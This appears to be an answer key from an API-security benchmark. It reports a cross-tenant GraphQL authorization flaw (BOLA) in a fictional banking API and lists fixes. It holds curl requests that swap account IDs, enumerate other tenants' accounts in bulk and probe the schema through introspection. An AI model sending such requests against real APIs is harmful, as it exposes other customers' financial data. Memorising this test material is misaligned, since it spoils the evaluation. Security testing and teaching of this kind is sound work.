# Expected Response

## System
- Domain: Financial Services / Retail Banking
- System: NexaBank Open Finance API
- Example ID: GQL-0402

## Priority Findings

### Finding 1: GraphQL BOLA — Nested resources without parent authorization (Pattern 1.7)
**Severity:** Critical
**Category:** BOLA

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 1.7 (Nested resources without parent authorization) vulnerability.
An authenticated user belonging to `tenant-fe32` can access or manipulate objects owned by
`tenant-b03e` by supplying a cross-tenant `accountId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-fe32`
- Response body `tenantId`: `tenant-b03e` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-b03e`

**Root Cause:**
The resolver fetches the account by `accountId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-FE32>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getAccount(id: \"A-1402\") { accountId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-fe32"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-FE32>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getAccount(id: \"A-2402\") { accountId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-b03e"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-FE32>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkAccountLookup(ids: [\"A-2402\", \"A-3402\", \"A-4402\"]) { accountId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-FE32>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getAccount": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE accountId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkAccountLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
